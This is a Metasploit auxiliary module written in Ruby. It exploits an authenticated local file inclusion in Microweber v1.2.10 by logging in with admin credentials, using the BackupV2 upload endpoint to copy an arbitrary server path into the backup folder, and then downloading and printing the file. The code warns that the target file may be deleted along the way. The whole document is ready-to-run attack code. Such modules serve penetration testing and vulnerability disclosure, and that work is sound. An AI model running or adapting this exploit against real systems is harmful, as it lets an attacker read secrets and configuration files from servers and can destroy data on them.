##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microweber v1.2.10 Local File Inclusion (Authenticated)',
        'Description' => %q{
          Microweber v1.2.10 has a backup functionality. Upload and download endpoints can be combined to read any file from the filesystem.
          Upload function may delete the local file if the web service user has access.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Talha Karakumru <talhakarakumru[at]gmail.com>'
        ],
        'References' => [
          ['URL', 'https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/']
        ],
        'Notes' => {
          'SideEffects' => [ 'ARTIFACTS_ON_DISK', 'IOC_IN_LOGS' ],
          'Reliability' => [ 'REPEATABLE_SESSION' ],
          'Stability' => [ 'OS_RESOURCE_LOSS' ]
        },
        'Targets' => [
          [ 'Microweber v1.2.10', {} ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2022-01-30'
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
        OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
        OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
        OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
      ]
    )
  end

  def check
    check_version ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def check_version
    print_warning 'Triggering this vulnerability may delete the local file that is wanted to be read.'
    print_status 'Checking Microweber\'s version.'

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

    begin
      version = res.body[/Version:\s+\d+\.\d+\.\d+/].gsub(' ', '').gsub(':', ': ')
    rescue NoMethodError, TypeError
      return false
    end

    if version.include?('Version: 1.2.10')
      print_good 'Microweber ' + version
      return true
    end

    print_error 'Microweber ' + version
    return false
  end

  def try_login
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'user_login'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD'],
        'lang' => '',
        'where_to' => 'admin_content'
      }
    })

    if res.headers['Content-Type'] != 'application/json'
      print_status res.body
      return false
    end

    json_res = res.get_json_document

    if res.code != 200
      print_error 'Microweber cannot be reached.'
      return false
    end

    if !json_res['error'].nil?
      print_error json_res['error']
      return false
    end

    if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
      print_good json_res['success']
      @cookie = res.get_cookies
      return true
    end

    print_error 'An unknown error occurred.'
    return false
  end

  def try_upload
    print_status 'Uploading ' + datastore['LOCAL_FILE_PATH'] + ' to the backup folder.'
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
      'cookie' => @cookie,
      'vars_get' => {
        'src' => datastore['LOCAL_FILE_PATH']
      },
      'headers' => {
        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
      }
    })

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['success']
        print_good json_res['success']
        return true
      end
    end

    print_error 'Either the file cannot be read or the file does not exist.'
    return false
  end

  def try_download
    filename = datastore['LOCAL_FILE_PATH'].include?('\\') ? datastore['LOCAL_FILE_PATH'].split('\\')[-1] : datastore['LOCAL_FILE_PATH'].split('/')[-1]
    print_status 'Downloading ' + filename + ' from the backup folder.'

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
      'cookie' => @cookie,
      'vars_get' => {
        'filename' => filename
      },
      'headers' => {
        'Referer' => datastore['SSL'] ? 'https://' + datastore['RHOSTS'] + target_uri.path : 'http://' + datastore['RHOSTS'] + target_uri.path
      }
    })

    if res.headers['Content-Type'] == 'application/json'
      json_res = res.get_json_document

      if json_res['error']
        print_error json_res['error']
        return
      end
    end

    print_status res.body
  end

  def run
    if !check_version || !try_login
      return
    end

    if try_upload
      try_download
    end
  end
end
